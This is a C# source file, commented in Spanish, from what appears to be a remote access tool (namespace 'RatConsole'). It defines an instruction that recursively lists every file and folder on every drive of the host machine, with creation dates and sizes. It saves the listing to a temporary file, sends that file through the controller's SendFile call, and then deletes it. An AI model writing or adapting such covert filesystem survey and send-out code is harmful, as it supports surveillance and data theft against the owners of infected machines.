using System;
using System.IO;
using System.Text;

using Bau.Libraries.LibMarkupLanguage;

namespace RatConsole.Domain
{
	/// <summary>
	///		Instrucción para listar los archivos del ordenador
	/// </summary>
	public class ListFilesInstructionModel : BaseInstructionModel
	{
		// Constantes públicas
		public const string TagRoot = "ListFiles";

		public ListFilesInstructionModel(Controllers.ProgramManager manager) : base(manager) {}

		/// <summary>
		///		Interpreta el nodo
		/// </summary>
		public override BaseInstructionModel Parse(MLNode nodeML)
		{
			// Interpreta los datos básicos
			ParseInternal(nodeML);
			// Devuelve la instrucción interpretada
			return this;
		}

		/// <summary>
		///		Ejecuta la instrucción
		/// </summary>
		protected override void ExecuteInternal()
		{
			string fileName = Path.GetTempFileName();
			StringBuilder buffer;

				// Log
				Manager.Log($"Obteniendo la lista de archivos ...");
				// Ejecuta la instrucción
				buffer = ListDrivesContent();
				// Log
				Manager.Log(buffer.ToString());
				// Graba el archivo de texto y lo envía
				Bau.Libraries.LibCommonHelper.Files.HelperFiles.SaveTextFile(fileName, buffer.ToString());
				Manager.SendFile(fileName);
				// Elimina el archivo creado
				Bau.Libraries.LibCommonHelper.Files.HelperFiles.KillFile(fileName);
				// Log
				Manager.Log($"Fin de la obtención de archivos");
		}

		/// <summary>
		///		Lista el contenido de todas las unidades
		/// </summary>
		private StringBuilder ListDrivesContent()
		{
			var buffer = new StringBuilder();

				try
				{
					foreach (DriveInfo drive in DriveInfo.GetDrives())
						if (drive.IsReady)
							ListFolders(buffer, drive.RootDirectory);
				}
				catch {}
				// Devuelve el contenido
				return buffer;
        }

		/// <summary>
		///		Lista el contenido de todas las carpetas
		/// </summary>
		private void ListFolders(StringBuilder buffer, DirectoryInfo pathBase)
		{
			foreach (DirectoryInfo folder in pathBase.GetDirectories())
				try
				{
					// Añade el nombre del directorio
					buffer.AppendLine($"Path\t{folder.FullName}");
					// Añade los archivos
					ListFiles(buffer, folder);
					// Añade los subdirectorios
					ListFolders(buffer, folder);
				}
				catch {}
		}

		/// <summary>
		///		Lista los archivos
		/// </summary>
		private void ListFiles(StringBuilder buffer, DirectoryInfo folder)
		{
			foreach (FileInfo file in folder.GetFiles())
				buffer.AppendLine($"File\t{file.FullName}\t{file.CreationTime:yyyy-MM-dd HH:mm:ss}\t{file.Length:#,##0}");
		}

		/// <summary>
		///		Obtiene los datos del nodo
		/// </summary>
		public override MLNode GetMLNode()
		{
			return GetMLNodeInternal(TagRoot);
		}
	}
}
